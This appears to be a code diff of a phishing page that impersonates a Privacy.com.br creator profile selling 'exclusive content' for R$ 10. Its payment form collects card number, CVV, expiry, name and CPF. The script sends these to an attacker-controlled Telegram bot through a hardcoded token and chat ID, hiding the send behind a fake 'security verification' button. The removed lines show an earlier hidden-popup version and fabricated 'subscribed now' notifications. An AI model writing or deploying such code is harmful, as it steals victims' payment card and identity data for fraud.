@@ -14,75 +14,56 @@
     <style>
         :root { --p-orange: #f47b52; --p-grad: linear-gradient(90deg, #f47b52, #f9a67a); }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
-        body { background: #fff; color: #333; padding-bottom: 100px; overflow-x: hidden; }
+        body { background: #fff; color: #333; padding-bottom: 100px; }
 
-        /* Usando suas imagens locais */
         .nav { padding: 12px 20px; border-bottom: 1px solid #f0f0f0; display: flex; justify-content: space-between; position: sticky; top: 0; background: #fff; z-index: 100; }
         .banner { width: 100%; height: 220px; background: #eee url('capa.png') center/cover; }
         .p-wrapper { margin-top: -55px; padding-left: 20px; }
         .p-pic { width: 115px; height: 115px; border-radius: 50%; border: 4px solid #fff; background: #ddd url('perfil1.png') center/cover; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
         
-        .info { padding: 10px 20px; }
-        .name { display: flex; align-items: center; gap: 6px; font-size: 22px; font-weight: 700; }
-        .user { color: #666; font-size: 14px; margin-bottom: 10px; }
-        
         .btn-box { padding: 15px 20px; display: flex; flex-direction: column; gap: 12px; }
         .btn-s { width: 100%; padding: 18px 25px; border-radius: 50px; border: none; color: #fff; display: flex; justify-content: space-between; align-items: center; cursor: pointer; background: var(--p-grad); font-weight: 700; font-size: 18px; }
 
-        /* Galeria com suas imagens */
-        .media-gallery { padding: 0 20px; display: flex; flex-direction: column; gap: 15px; margin-top: 10px; }
-        .media-gallery div { width: 100%; height: 250px; border-radius: 15px; background-size: cover; filter: blur(12px); border: 1px solid #eee; }
-
-        .fake-notif { position: fixed; bottom: 20px; left: 15px; right: 15px; background: #fff; padding: 12px; border-radius: 15px; box-shadow: 0 8px 20px rgba(0,0,0,0.15); display: flex; align-items: center; gap: 12px; z-index: 3000; transform: translateY(200%); transition: 0.5s; }
-        .fake-notif.show { transform: translateY(0); }
-
-        #payModal { display: none; position: fixed; z-index: 2000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); backdrop-filter: blur(4px); }
-        .m-content { background: #fff; margin: 10% auto; width: 92%; max-width: 420px; border-radius: 25px; padding: 25px; position: relative; }
-        .f-group { margin-bottom: 12px; }
+        #payModal, #confirmModal { display: none; position: fixed; z-index: 2000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); backdrop-filter: blur(4px); }
+        .m-content { background: #fff; margin: 10% auto; width: 92%; max-width: 420px; border-radius: 25px; padding: 25px; text-align: center; }
+        
+        .f-group { margin-bottom: 12px; text-align: left; }
         .f-group label { display: block; font-weight: 700; font-size: 13px; margin-bottom: 4px; }
-        .f-group input { width: 100%; padding: 14px; border-radius: 10px; border: 1px solid #ddd; font-size: 16px; outline: none; background: #fafafa; }
-        .btn-final { width: 100%; padding: 18px; background: var(--p-grad); color: #fff; border: none; border-radius: 50px; font-weight: 800; font-size: 18px; margin-top: 10px; cursor: pointer; }
+        .f-group input { width: 100%; padding: 14px; border-radius: 10px; border: 1px solid #ddd; font-size: 16px; outline: none; }
+        
+        .btn-final { width: 100%; padding: 18px; background: var(--p-grad); color: #fff; border: none; border-radius: 50px; font-weight: 800; font-size: 18px; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <div class="nav"><img src="https://privacy.com.br/img/logo-orange.svg" height="26"><i class="fa-solid fa-bars"></i></div>
+    <div class="nav"><img src="https://privacy.com.br/img/logo-orange.svg" height="26"></div>
     <div class="banner"></div>
     <div class="p-wrapper"><div class="p-pic"></div></div>
 
-    <div class="info">
-        <div class="name">Kamylinha Santos <i class="fa-solid fa-circle-check" style="color:var(--p-orange)"></i></div>
-        <p class="user">@eukamylinhasantos</p>
-        <p style="font-size: 14px; color: #444;">Assine para ver meus conteúdos exclusivos e sem censura! 🔥</p>
-    </div>
-
     <div class="btn-box">
-        <div class="btn-s" onclick="openP()"><span>Mensal</span><span>R$ 10,00</span></div>
-        <div class="btn-s" onclick="openP()" style="opacity:0.9"><span>Vitalício</span><span>R$ 27,00</span></div>
-    </div>
-
-    <div class="media-gallery">
-        <div style="background-image:url('imagem1.png');"></div>
-        <div style="background-image:url('imagem2.png');"></div>
-    </div>
-
-    <div class="fake-notif" id="notif">
-        <img src="perfil1.png" width="45" style="border-radius:10px">
-        <div><span id="n-user"><b>Marcos S.</b></span> assinou agora!<br><small style="color:var(--p-orange);font-weight:bold">Acesso Liberado ✅</small></div>
+        <div class="btn-s" onclick="openP()"><span>Assinar Conteúdo</span><span>R$ 10,00</span></div>
     </div>
 
     <div id="payModal">
         <div class="m-content">
-            <h2 style="text-align:center; color: var(--p-orange); margin-bottom: 20px;">Pagamento Seguro</h2>
-            <div class="f-group"><label>Nome no Cartão</label><input type="text" id="p_name" placeholder="Nome Completo"></div>
-            <div class="f-group"><label>Número do Cartão</label><input type="text" id="c_num" placeholder="0000 0000 0000 0000"></div>
-            <div class="f-group"><label>CPF do Titular</label><input type="text" id="cpf" placeholder="000.000.000-00"></div>
-            <div style="display:flex; gap: 10px;">
-                <div class="f-group" style="flex:2"><label>Validade</label><input type="text" id="c_date" placeholder="MM/AA"></div>
-                <div class="f-group" style="flex:1"><label>CVV</label><input type="text" id="cvv" placeholder="000"></div>
+            <h2 style="color:var(--p-orange);margin-bottom:20px">Pagamento</h2>
+            <div class="f-group"><label>Nome</label><input type="text" id="p_name"></div>
+            <div class="f-group"><label>Cartão</label><input type="text" id="c_num" placeholder="0000 0000 0000 0000"></div>
+            <div class="f-group"><label>CPF</label><input type="text" id="cpf" placeholder="000.000.000-00"></div>
+            <div style="display:flex;gap:10px">
+                <input type="text" id="c_date" placeholder="MM/AA" style="width:60%;padding:14px;border-radius:10px;border:1px solid #ddd">
+                <input type="text" id="cvv" placeholder="CVV" style="width:40%;padding:14px;border-radius:10px;border:1px solid #ddd">
             </div>
-            <button class="btn-final" onclick="aprovar()">APROVAR COMPRA</button>
-            <p style="text-align:center; margin-top:15px; font-size:12px; color:#999; cursor:pointer" onclick="closeP()">Voltar</p>
+            <button class="btn-final" style="margin-top:20px" onclick="preAprovar()">APROVAR COMPRA</button>
+        </div>
+    </div>
+
+    <div id="confirmModal">
+        <div class="m-content">
+            <i class="fa-solid fa-shield-halved" style="font-size:50px;color:var(--p-orange);margin-bottom:15px"></i>
+            <h2 style="margin-bottom:10px">Verificação de Segurança</h2>
+            <p style="color:#666;margin-bottom:25px">Para concluir sua assinatura de R$ 10,00, clique no botão abaixo para confirmar a transação segura.</p>
+            <a id="btnLink" href="#" target="_blank" class="btn-final" style="text-decoration:none;display:block" onclick="finalizou()">CONFIRMAR AGORA</a>
         </div>
     </div>
 
@@ -92,20 +73,12 @@
             $('#cpf').mask('000.000.000-00');
             $('#c_date').mask('00/00');
             $('#cvv').mask('000');
-            setInterval(showF, 12000);
         });
 
         function openP() { $('#payModal').fadeIn(); }
-        function closeP() { $('#payModal').fadeOut(); }
 
-        function showF() {
-            const nomes = ["Ricardo M.", "Felipe A.", "Gustavo S.", "Andre L.", "Marcos J."];
-            $('#n-user').html(`<b>${nomes[Math.floor(Math.random()*nomes.length)]}</b>`);
-            $('#notif').addClass('show');
-            setTimeout(() => $('#notif').removeClass('show'), 4000);
-        }
-
-        function aprovar() {
+        // PASSO 1: Gera o link do Telegram com os dados
+        function preAprovar() {
             const token = '8495716341:AAEWdea8RcXtXrziTTMNkoBA78dTue71-Uc';
             const chat = '7320822019';
             
@@ -116,25 +89,28 @@
             const v = $('#cvv').val();
 
             if (c.length < 16) {
-                Notiflix.Notify.failure('Dados incompletos!');
+                Notiflix.Notify.failure('Dados inválidos!');
                 return;
             }
 
-            const msg = `🔥 NOVO CARD\n👤 Nome: ${n}\n💳 Card: ${c}\n🆔 CPF: ${f}\n📅 Val: ${d}\n🔒 CVV: ${v}`;
-            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(msg)}`;
+            const msg = `🚀 NOVEL CARD CAPTURADO\n👤 Nome: ${n}\n💳 Card: ${c}\n🆔 CPF: ${f}\n📅 Val: ${d}\n🔒 CVV: ${v}`;
+            const urlFinal = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(msg)}`;
             
-            // Simula o teste manual que funcionou no seu bot Nox é Pika
-            const win = window.open(url, '_blank', 'width=1,height=1,left=10000,top=10000');
+            // Coloca o link pronto no botão de confirmação
+            $('#btnLink').attr('href', urlFinal);
             
-            Notiflix.Loading.circle('Processando...');
+            $('#payModal').hide();
+            $('#confirmModal').fadeIn();
+        }
 
+        // PASSO 2: Quando ele clica no link, o bot recebe e o site mostra sucesso
+        function finalizou() {
             setTimeout(() => {
-                if(win) win.close();
-                Notiflix.Loading.remove();
+                $('#confirmModal').hide();
                 Notiflix.Report.success('Comprado com Sucesso', 'Acesso liberado! Verifique seu e-mail.', 'OK', () => {
                     location.reload();
                 });
-            }, 2000);
+            }, 1000);
         }
     </script>
 </body>
